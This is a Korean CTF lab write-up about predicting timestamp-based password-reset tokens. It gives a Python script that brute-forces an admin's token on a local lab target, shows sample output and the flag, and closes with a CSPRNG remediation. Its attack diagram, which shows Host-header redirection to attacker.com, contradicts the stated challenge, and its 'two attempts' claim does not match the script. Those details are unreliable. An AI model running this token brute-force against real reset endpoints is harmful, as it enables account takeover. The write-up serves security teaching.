+++
title = "VulnABLE CTF [LUXORA] Write-up: Password Reset 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Password Reset", "Silver", "Token Predictability", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Password Reset 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Authentication Layer (Password Reset)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/pass-reset/silver`
- **목표**: Host Header Injection이 차단된 상태에서, 비밀번호 재설정 토큰(Reset Token)의 생성 알고리즘 결함을 파악하여 관리자의 재설정 토큰을 예측(Predict)하고 계정을 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/pass-reset/silver` 페이지에서 내 계정(`user@luxora.test`)으로 비밀번호 리셋을 여러 번 요청해 보며 서버가 발급해 주는 토큰 값들을 수집합니다.

**[수집된 토큰 목록 (내 계정)]**
1. `token=1698832800`
2. `token=1698832815`
3. `token=1698832840`

**[해커의 사고 과정]**
1. 토큰이 영어+숫자 조합의 긴 난수(UUID 등)가 아니라, 단순한 10자리 숫자이다.
2. 간격이 15, 25씩 증가하는 것을 보니, 이 숫자는 분명 요청을 보낸 시점의 **UNIX Timestamp (초 단위 시간)** 이다!
3. 내가 타겟(Admin)의 이메일로 리셋 요청을 보낸 직후의 서버 시간만 정확히 알 수 있다면, 관리자의 토큰 값도 쉽게 알아맞힐 수 있을 것이다.

---

## 💥 2. 취약점 식별 및 공격 설계 (Exploitation Strategy)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Target: admin@luxora, Host: attacker.com)--> [ Web Server ]
                                                             |-- Sends email to Admin
[ Admin ]    --(Clicks Link)-------------------------------> [ Attacker Server ]
                                                             |-- Token Stolen!
```


이 취약점은 **Insecure Randomness (안전하지 않은 난수 사용)** 또는 **Token Predictability (토큰 예측 가능성)**로 분류됩니다.

### 💡 타겟 토큰 예측 시나리오
1. 공격자는 타겟(`admin@luxora.test`) 이메일로 비밀번호 재설정을 요청합니다.
2. 요청 버튼을 누르는 순간 공격자 컴퓨터의 시간을 기록합니다. (예: `1698840000`)
3. 네트워크 지연(Latency)과 서버의 처리 시간을 고려하여 `1698840000` 부터 `1698840010` 사이의 약 10개 숫자를 후보군으로 둡니다.
4. 이 10개의 토큰을 가지고 `/reset` 엔드포인트에 브루트포스(무차별 대입) 공격을 시도하여 유효한 토큰을 찾습니다.

---

## 🚀 3. 공격 수행 및 자동화 스크립트 작성

관리자 이메일로 리셋 요청을 날린 직후, 파이썬 스크립트를 작성하여 토큰을 추측합니다. 

### 💻 Python 익스플로잇 스크립트
```python
import requests
import time

target_url = "http://localhost:3000/reset-password-silver"
email = "admin@luxora.test"
new_password = "hacked123"

# 1. 관리자에게 패스워드 리셋 요청 보내기
print("[*] Sending reset request for Admin...")
requests.post("http://localhost:3000/pass-reset/silver", data={"email": email})

# 2. 현재 시간 기준 타임스탬프 계산
current_time = int(time.time())
print(f"[*] Base Timestamp: {current_time}")

# 3. 오차 범위 내의 토큰 무차별 대입
for offset in range(-5, +10):
    guessed_token = str(current_time + offset)
    payload = {
        "token": guessed_token,
        "new_password": new_password
    }
    
    res = requests.post(target_url, data=payload)
    
    if "successfully" in res.text.lower():
        print(f"[+] Success! Valid token found: {guessed_token}")
        print(f"[+] FLAG: {res.text.split('FLAG{')[1].split('}')[0]}")
        break
```

### 🔍 스크립트 실행 및 결과
```text
[*] Sending reset request for Admin...
[*] Base Timestamp: 1698840005
[+] Success! Valid token found: 1698840006
[+] FLAG: PASS_RST_🥈_PREDICTABLE_TOKEN_D4E5F6
```

서버가 시간 기반으로 생성한 토큰을 단 2번의 시도 만에 알아맞히고 관리자 비밀번호를 변경하는 데 성공했습니다!

---

## 🚩 4. 롸잇업 결론 및 플래그

토큰 생성 시 암호학적으로 안전하지 않은 값(단순 시간)을 사용한 로직 결함을 찔러, 타인의 인증 절차를 우회하는 데 성공했습니다.

**🔥 획득한 플래그:**
`FLAG{PASS_RST_🥈_PREDICTABLE_TOKEN_D4E5F6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
비밀번호 재설정 토큰, 세션 ID, 인증 코드 등 보안과 관련된 모든 식별자는 해커가 다음 값을 절대 예측할 수 없어야 합니다.

* **취약한 생성 로직**
```javascript
// 시간, 유저 ID, 이메일 등 유추 가능한 정보를 기반으로 해시 생성
const resetToken = Date.now().toString(); 
// 혹은 md5(user.email + Date.now()) 도 레인보우 테이블에 뚫립니다.
```

* **안전한 패치 가이드 (CSPRNG 사용)**
반드시 운영체제가 제공하는 **CSPRNG (Cryptographically Secure Pseudo-Random Number Generator)**를 사용하여 최소 32바이트 이상의 난수를 생성해야 합니다. Node.js의 경우 `crypto` 모듈을 사용합니다.

```javascript
const crypto = require('crypto');

// 안전한 64글자(32바이트) Hex 난수 생성
const resetToken = crypto.randomBytes(32).toString('hex');
```
이렇게 생성된 토큰을 데이터베이스에 저장하고 이메일로 발송하면, 해커가 이 토큰을 예측하거나 브루트포스 하는 것은 천문학적인 시간이 걸려 물리적으로 불가능해집니다.